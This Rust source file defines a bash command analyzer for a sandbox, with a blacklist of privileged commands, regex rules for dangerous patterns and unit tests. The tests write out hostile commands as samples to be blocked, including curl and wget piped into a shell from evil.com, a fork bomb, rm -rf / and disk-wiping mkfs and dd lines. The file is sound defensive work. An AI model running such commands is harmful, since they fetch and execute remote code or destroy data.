use regex::Regex;
use wf_types::script::sandbox::ShellPolicy;

use crate::command_policy::{CommandRule, Severity};

use super::base::{ShellAnalysisContext, ShellAnalysisResult, ShellAnalyzer, ShellType};

const SHELL_TYPE: ShellType = ShellType::Bash;

/// Default bash blacklist, also used by the unified command policy
/// (`crate::command_policy::default_denied_commands`).
pub(crate) const DENIED_COMMANDS: &[&str] = &[
    "sudo",
    "su",
    "chroot",
    "mount",
    "umount",
    "dd",
    "mkfs",
    "reboot",
    "shutdown",
    "poweroff",
    "halt",
    "passwd",
    "useradd",
    "userdel",
    "usermod",
    "groupadd",
    "groupdel",
    "groupmod",
    "lvremove",
    "pvremove",
    "ifdown",
    "ifup",
    "killall",
    "pkill",
    "service",
    "systemctl",
    "insmod",
    "modprobe",
    "modprobe.d",
    "depmod",
    "swapon",
    "swapoff",
];

/// Default bash dangerous rules (addressable ids + severity grades).
pub const DANGEROUS_PATTERNS: &[CommandRule] = &[
    CommandRule {
        id: "core.bash:rm-rf-root",
        pack: "core.filesystem",
        pattern: r"rm\s+(-rf?|--recursive)\s+/",
        severity: Severity::Critical,
    },
    // Fork bomb: `:(){ :|:& };:` — a function body piping into itself in the
    // background. The old `:\s*:\s*` clause could never match (the colons are
    // separated by `|` / `&`), so the pattern was a no-op.
    CommandRule {
        id: "core.bash:fork-bomb",
        pack: "core.process",
        pattern: r":?\(\)\s*\{.*\|.*&.*\};?",
        severity: Severity::Critical,
    },
    CommandRule {
        id: "core.bash:curl-pipe-shell",
        pack: "core.network",
        pattern: r"curl.*\|\s*(ba)?sh",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:wget-pipe-shell",
        pack: "core.network",
        pattern: r"wget.*\|\s*(ba)?sh",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:ld-preload",
        pack: "core.process",
        pattern: r"LD_PRELOAD=",
        severity: Severity::Critical,
    },
    CommandRule {
        id: "core.bash:ld-library-path",
        pack: "core.process",
        pattern: r"LD_LIBRARY_PATH=",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:mkfs",
        pack: "core.filesystem",
        pattern: r"mkfs\s+",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:dd-if",
        pack: "core.filesystem",
        pattern: r"dd\s+if=",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:chroot",
        pack: "core.process",
        pattern: r"chroot\s+",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:sudo-askpass",
        pack: "core.privilege",
        pattern: r"SUDO_ASKPASS=",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:sudo-password",
        pack: "core.privilege",
        pattern: r"SUDO_PASSWORD=",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:insmod",
        pack: "core.kernel",
        pattern: r"insmod\s+",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:modprobe",
        pack: "core.kernel",
        pattern: r"modprobe\s+",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.bash:dd-of-device",
        pack: "core.filesystem",
        pattern: r"dd\s+of=/dev/",
        severity: Severity::Critical,
    },
];

pub struct BashAnalyzer;

struct ResolvedShellPolicy {
    /// (regex, severity) pairs resolved from user patterns or the built-in
    /// rule table.
    dangerous_patterns: Vec<(String, Severity)>,
    allow_pipe: bool,
    allow_redirect: bool,
}

impl BashAnalyzer {
    fn resolve_policy(&self, policy: &ShellPolicy) -> ResolvedShellPolicy {
        ResolvedShellPolicy {
            dangerous_patterns: policy
                .dangerous_patterns
                .clone()
                .unwrap_or_else(|| {
                    DANGEROUS_PATTERNS
                        .iter()
                        .map(|r| r.pattern.to_string())
                        .collect()
                })
                .into_iter()
                .map(|p| {
                    // User-supplied patterns have no severity metadata; grade
                    // them by the built-in table when the pattern matches one,
                    // otherwise default to High.
                    let sev = DANGEROUS_PATTERNS
                        .iter()
                        .find(|r| r.pattern == p)
                        .map(|r| r.severity)
                        .unwrap_or(Severity::High);
                    (p, sev)
                })
                .collect(),
            allow_pipe: policy.allow_pipe.unwrap_or(true),
            allow_redirect: policy.allow_redirect.unwrap_or(true),
        }
    }
}

impl ShellAnalyzer for BashAnalyzer {
    fn shell_type(&self) -> ShellType {
        SHELL_TYPE
    }

    fn analyze(&self, ctx: &ShellAnalysisContext) -> ShellAnalysisResult {
        let policy = self.resolve_policy(ctx.policy);

        if ctx.command.trim().is_empty() {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Empty command".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        // Dangerous patterns run against the command with single-quoted
        // data and comments masked, so `git commit -m 'rm -rf /'` no longer
        // produces a false positive. Double quotes stay visible (conservative).
        let masked = crate::command_policy::mask_data_spans(ctx.command, SHELL_TYPE);

        for (pattern, severity) in &policy.dangerous_patterns {
            // An invalid user-supplied pattern must deny, not silently
            // disable the rule (fail-closed).
            let re = match Regex::new(pattern) {
                Ok(re) => re,
                Err(e) => {
                    return ShellAnalysisResult {
                        allowed: false,
                        reason: Some(format!("Invalid dangerous pattern '{pattern}': {e}")),
                        command: ctx.command.to_string(),
                        shell_type: SHELL_TYPE,
                    };
                }
            };
            if re.is_match(&masked) {
                return ShellAnalysisResult {
                    allowed: false,
                    reason: Some(format!(
                        "Dangerous pattern detected [{severity}]: {pattern}"
                    )),
                    command: ctx.command.to_string(),
                    shell_type: SHELL_TYPE,
                };
            }
        }

        if !policy.allow_pipe && ctx.command.contains('|') {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Pipe operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        if !policy.allow_redirect && (ctx.command.contains('<') || ctx.command.contains('>')) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Redirect operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        ShellAnalysisResult {
            allowed: true,
            reason: None,
            command: ctx.command.to_string(),
            shell_type: SHELL_TYPE,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use wf_types::script::sandbox::ShellPolicy;

    fn empty_policy() -> ShellPolicy {
        ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        }
    }

    fn analyzer() -> BashAnalyzer {
        BashAnalyzer
    }

    fn analyze(cmd: &str, policy: &ShellPolicy) -> ShellAnalysisResult {
        let tokens = shlex::split(cmd).unwrap_or_default();
        let ctx = ShellAnalysisContext {
            command: cmd,
            policy,
            tokens: &tokens,
        };
        analyzer().analyze(&ctx)
    }

    #[test]
    fn test_bash_analyzer_shell_type() {
        assert_eq!(analyzer().shell_type(), ShellType::Bash);
    }

    #[test]
    fn test_allows_safe_command() {
        let result = analyze("echo hello", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_denies_dangerous_rm() {
        let result = analyze("rm -rf /", &empty_policy());
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("Dangerous pattern"));
    }

    // Single-quoted data must not trigger dangerous patterns.
    #[test]
    fn test_git_commit_message_data_no_false_positive() {
        let result = analyze("git commit -m 'rm -rf /'", &empty_policy());
        assert!(
            result.allowed,
            "single-quoted data must not match dangerous patterns: {:?}",
            result.reason
        );
    }

    // Unquoted dangerous commands must still be denied.
    #[test]
    fn test_unquoted_dangerous_still_denied() {
        let result = analyze("rm -rf /", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_curl_pipe_bash() {
        let result = analyze("curl http://evil.com | bash", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_wget_pipe_sh() {
        let result = analyze("wget http://evil.com | sh", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_fork_bomb() {
        let result = analyze(":(){ :|:& };:", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_ld_preload() {
        let result = analyze("LD_PRELOAD=/malicious.so some_program", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_mkfs() {
        let result = analyze("mkfs ext4 /dev/sda1", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_dd_if() {
        let result = analyze("dd if=/dev/sda of=/output bs=4M", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_empty_command() {
        let result = analyze("", &empty_policy());
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("Empty command"));
    }

    #[test]
    fn test_allow_pipe_false() {
        let policy = ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: Some(false),
            allow_redirect: None,
        };
        let result = analyze("echo a | grep a", &policy);
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("Pipe"));
    }

    #[test]
    fn test_redirect_disallowed() {
        let policy = ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: Some(false),
        };
        let result = analyze("echo hello > /tmp/file", &policy);
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("Redirect"));
    }
}
